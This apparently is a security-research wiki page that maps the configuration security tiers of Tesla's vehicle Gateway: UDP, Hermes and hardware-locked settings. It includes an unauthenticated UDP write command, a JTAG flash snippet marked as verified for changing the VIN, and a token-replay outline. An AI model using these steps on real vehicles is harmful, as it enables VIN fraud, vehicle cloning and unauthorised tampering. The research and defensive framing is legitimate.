# Gateway Security Model

**Two-tier configuration security: UDP (insecure) vs Hermes (secure).**

---

## Executive Summary

The Gateway implements a two-tier security model for configuration access:

| Tier | Access Method | Authentication | Examples |
|------|---------------|----------------|----------|
| **Insecure** | UDP port 3500 | None required | Map region, units |
| **Secure** | Hermes + gw-diag | Token + signature | VIN, country, supercharger |

**Source:** Confirmed by Tesla internal source and Odin database analysis.

---

## Tier 1: Insecure Configs (UDP)

### Access Method

- **Port:** UDP 3500
- **Authentication:** None required
- **Tool:** `gateway_database_query.py` or any UDP client

### Insecure Configs Identified

| Config | Access ID | Description | Risk |
|--------|-----------|-------------|------|
| `ecuMapVersion` | 33 | ECU configuration version | Low |
| `autopilotTrialExpireTime` | 54 | AP trial expiration | Medium |
| `bmpWatchdogDisabled` | 61 | Battery Management watchdog | Medium |
| `mapRegion` | 66 | Navigation map region | Low |
| Display units | Various | mi/km, °F/°C | None |
| Debug flags | Various | Debug UART, etc. | Low |

### Evidence

From Odin routines database:
```json
{
  "accessId": 33,
  "accessLevel": "UDP",  // ← INSECURE FLAG
  "codeKey": "ecuMapVersion"
}
```

Configs with `accessLevel: "UDP"` can be modified without authentication.

### Exploitation

```bash
# Change map region to EU
python3 scripts/gateway_database_query.py write 0x0014 0x01

# No authentication required!
```

---

## Tier 2: Secure Configs (Hermes)

### Access Method

- **Tool:** gw-diag (Tesla service tool)
- **Authentication:** Hermes mTLS session + token + signature
- **Method:** "Extra params or extra hex" in gw-diag commands

### Secure Configs Identified

| Config | Description | Why Secure |
|--------|-------------|------------|
| VIN (0x0000) | Vehicle identity | Fraud prevention |
| Country (0x0006) | Regulatory code | Homologation |
| Supercharger access | Payment authorization | Revenue protection |
| Firmware hashes | Integrity verification | Anti-tamper |
| Hardware part numbers | Component identity | Cloning prevention |

### Evidence

Configs WITHOUT `accessLevel: "UDP"` that control paid features or identity are secure.

```json
{
  "accessId": 30,
  "codeKey": "superchargingAccess",
  // NO accessLevel: "UDP" → SECURE
}
```

---

## Tier 3: Hardware-Locked (GTW)

### Access Method

- **Cannot be changed** via any software interface
- Controlled by hardware fuses

### GTW-Locked Configs

| Config | Description |
|--------|-------------|
| `devSecurityLevel` (ID 15) | Debug security level |

```json
{
  "accessId": 15,
  "accessLevel": "GTW",  // ← HARDWARE LOCKED
  "codeKey": "devSecurityLevel",
  "content": {
    "enums": [
      {"codeKey": "LC_FACTORY", "value": 3, "description": "Factory security - CUST_DEL"},
      {"codeKey": "LC_GATED", "value": 2, "description": "Post-gate - OEM_PROD"}
    ]
  }
}
```

**Interpretation:** This config controls the MPC5748G hardware security fuses. Cannot be changed after production.

---

## Authentication Flow

### Secure Config Write

```
Tesla Toolbox → Hermes VPN (WSS:443) → MCU → gw-diag → Gateway

1. Tesla technician authenticates to Toolbox
2. Toolbox establishes Hermes session (mTLS)
3. Runs gw-diag with auth parameters:
   
   gw-diag write 0x0000 \
     --auth-token <hermes_token> \
     --signature <ed25519_sig> \
     --value "5YJSA1E26HF000001"

4. Gateway validates:
   - Token from authenticated session
   - Signature covers [config_id][value][timestamp]
   - Signed by Tesla service key

5. If valid → write to flash
   If invalid → reject with error
```

### Signature Format (Hypothesized)

```
Message: [config_id:2][new_value:N][timestamp:8][reason:4]
Key: Tesla service Ed25519 private key
Signature: 64 bytes
```

---

## Security Boundary

### What Attackers Can Access

| Access Level | Capabilities |
|--------------|--------------|
| **Network only (UDP:3500)** | Read all configs, write insecure only |
| **With JTAG hardware** | Full flash access, bypass all software security |
| **With Hermes MITM** | Token replay possible, signature forgery unlikely |

### Attack Surface Summary

```
┌─────────────────────────────────────────────────────────┐
│                    GATEWAY SECURITY                     │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  UDP:3500 (INSECURE)          HERMES (SECURE)          │
│  ─────────────────────        ─────────────────        │
│  • No authentication          • mTLS required          │
│  • Any network device         • Token validation       │
│  • Map region, units          • Signature verify       │
│  • Debug flags                • VIN, country           │
│                               • Supercharger           │
│                               • Paid features          │
│                                                         │
│  ┌─────────────────────────────────────────────────┐   │
│  │  JTAG (PHYSICAL)                                │   │
│  │  ─────────────────────────────────────────────  │   │
│  │  • Bypasses ALL software security               │   │
│  │  • Direct flash read/write                      │   │
│  │  • Can modify ANY config including VIN          │   │
│  │  • Blocked by fuses on production vehicles      │   │
│  └─────────────────────────────────────────────────┘   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

## Bypass Methods

### Method 1: JTAG Flash Modification ✅ VERIFIED

**Requires:** Hardware access, JTAG adapter, unfused chip or glitch

```python
# Direct flash modification
flash = read_jtag_flash(0x19000, 0x10000)

# Modify VIN at config 0x0000
new_vin = b"5YJSA1E26HF000001"
new_crc = calculate_crc8(0x0000, new_vin)
entry = bytes([new_crc, len(new_vin) + 2]) + b'\x00\x00' + new_vin

write_jtag_flash(0x19000, entry)
# VIN changed, all software security bypassed
```

**Status:** Working on unfused vehicles or after voltage glitching.

### Method 2: Hermes Token Replay ⚠️ THEORETICAL

```
1. MITM Hermes connection
2. Capture gw-diag command with auth token
3. Replay token to modify different config

Risk: Tokens likely time-limited and vehicle-specific
```

**Status:** Untested, requires Hermes session capture.

### Method 3: Signature Forgery ❌ IMPRACTICAL

```
Requires Tesla's Ed25519 private key
Key size: 256 bits
Brute force: Infeasible
```

**Status:** Not practical without key compromise.

---

## Testing Config Security

### Identify Secure vs Insecure

```python
def test_config_security(config_id: int, test_value: bytes):
    """Try to write via UDP; secure configs will fail."""
    result = gateway_write_config(config_id, test_value)
    
    if result == ERROR_PERMISSION_DENIED:
        return "SECURE"
    elif result == SUCCESS:
        return "INSECURE"
    else:
        return f"UNKNOWN: {result}"
```

### Known Security Status

| Config ID | Name | UDP Write | Status |
|-----------|------|-----------|--------|
| 0x0000 | VIN | ❌ REJECTED | Secure |
| 0x0006 | Country | ❌ REJECTED | Secure |
| 0x0014 | mapRegion | ✅ ACCEPTED | Insecure |
| 0x0020 | ecuMapVersion | ✅ ACCEPTED | Insecure |

---

## Defense Layers

Tesla's security architecture:

| Layer | Protection | Bypass Method |
|-------|------------|---------------|
| 1. Network | UDP rejects secure config writes | N/A |
| 2. Authentication | Hermes token required | Token replay? |
| 3. Signature | Ed25519 validation | Key compromise |
| 4. Audit | All changes logged to Tesla | N/A (detection only) |
| 5. Hardware | JTAG fuses on production | Voltage glitching |
| 6. Detection | Firmware hash monitoring | Flash modification |

**Weak Point:** JTAG access bypasses layers 1-4.

---

## Recommendations

### For Researchers

1. Test each config ID via UDP to map secure boundary
2. Capture gw-diag commands during Tesla service
3. Analyze Hermes protocol for token validation
4. Document all access levels from Odin database

### For Security Assessment

1. **Physical security critical** - JTAG is the main bypass
2. **Network segmentation matters** - UDP:3500 access allows insecure config modification
3. **Token security unknown** - Need to test replay attacks
4. **Audit logging exists** - Changes may be detected

---

## Cross-References

- [Config System](config-system.md) - All 662 configs
- [UDP Protocol](udp-protocol.md) - Packet format
- [Odin Routines Database](../3-odin/routines-database.md) - Access levels
- [VIN Write Attack](../5-attacks/vin-write.md) - JTAG bypass

---

**Status:** VERIFIED ✅  
**Evidence:** Tesla internal source, Odin database with accessLevel flags  
**Last Updated:** 2026-02-07
